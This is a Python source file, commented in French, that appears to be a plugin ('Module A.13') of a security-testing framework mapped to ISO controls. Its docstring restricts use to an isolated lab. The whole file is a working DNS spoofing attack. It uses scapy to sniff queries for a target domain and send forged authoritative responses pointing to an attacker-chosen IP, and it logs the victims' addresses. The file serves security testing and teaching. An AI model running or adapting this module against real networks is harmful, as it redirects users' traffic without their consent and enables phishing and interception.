"""Module A.13 — DNS spoofing (lab local uniquement).

Sniffe les requêtes DNS sur une interface et répond de façon falsifiée
pour rediriger la résolution d'un domaine cible vers une IP contrôlée
par l'attaquant. Illustre l'absence de DNSSEC / validation d'intégrité
sur les résolutions DNS classiques.

À exécuter UNIQUEMENT sur un réseau que vous contrôlez explicitement
(lab isolé). Nécessite scapy et des privilèges root/administrateur.
"""

from __future__ import annotations

import logging
import os

from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send, sniff

from ..core.plugin_base import AttackModule, AttackResult
from ..core.registry import register

logger = logging.getLogger(__name__)


def _is_root() -> bool:
    return hasattr(os, "geteuid") and os.geteuid() == 0


@register
class DnsSpoofingModule(AttackModule):
    name = "dns_spoofing"
    iso_controls = ("A.13",)

    def run(
        self,
        target: str,
        spoof_ip: str | None = None,
        interface: str | None = None,
        duration: float = 30.0,
        **kwargs,
    ) -> AttackResult:
        """target = domaine à spoofer (ex: 'exemple.local'). spoof_ip =
        IP renvoyée à la victime à la place de la vraie résolution
        (obligatoire, pas de valeur par défaut sensée). Sniffe le trafic
        DNS pendant `duration` secondes et répond à chaque requête
        concernant `target` par une réponse forgée. Les requêtes pour
        d'autres domaines sont laissées de côté (pas de résolveur complet).
        """
        if not _is_root():
            return AttackResult(
                module_name=self.name,
                success=False,
                summary=(
                    "Privilèges insuffisants : ce module a besoin d'un accès "
                    "raw socket (root/administrateur) pour sniffer/forger des paquets DNS."
                ),
                evidence={},
            )

        if spoof_ip is None:
            raise ValueError("spoof_ip est obligatoire, ex: spoof_ip='192.168.1.50'")

        domain = target.rstrip(".").lower()
        spoofed_from: list[str] = []

        def _handle(pkt) -> None:
            if not pkt.haslayer(DNSQR) or pkt[DNS].qr != 0:
                return  # pas une requête DNS sortante, on ignore

            qname = pkt[DNSQR].qname.decode(errors="ignore").rstrip(".").lower()
            if qname != domain:
                return

            response = (
                IP(dst=pkt[IP].src, src=pkt[IP].dst)
                / UDP(dport=pkt[UDP].sport, sport=53)
                / DNS(
                    id=pkt[DNS].id,
                    qr=1,
                    aa=1,
                    qd=pkt[DNS].qd,
                    an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=spoof_ip),
                )
            )
            send(response, verbose=False)
            spoofed_from.append(pkt[IP].src)
            logger.info("Requête DNS spoofée pour '%s' depuis %s", domain, pkt[IP].src)

        try:
            sniff(
                filter="udp port 53",
                prn=_handle,
                iface=interface,
                timeout=duration,
                store=False,
            )
        except PermissionError as exc:
            return AttackResult(
                module_name=self.name,
                success=False,
                summary=f"Erreur de permission lors du sniffing : {exc}",
                evidence={},
            )
        except OSError as exc:
            return AttackResult(
                module_name=self.name,
                success=False,
                summary=f"Erreur réseau (interface invalide ?) : {exc}",
                evidence={"interface": interface},
            )

        if spoofed_from:
            summary = (
                f"{len(spoofed_from)} requête(s) DNS pour '{domain}' spoofée(s) "
                f"vers {spoof_ip} en {duration:.0f}s."
            )
        else:
            summary = f"Aucune requête DNS pour '{domain}' observée en {duration:.0f}s."

        return AttackResult(
            module_name=self.name,
            success=bool(spoofed_from),
            summary=summary,
            evidence={
                "domain": domain,
                "spoof_ip": spoof_ip,
                "interface": interface,
                "duration_s": duration,
                "victimes": spoofed_from,
            },
        )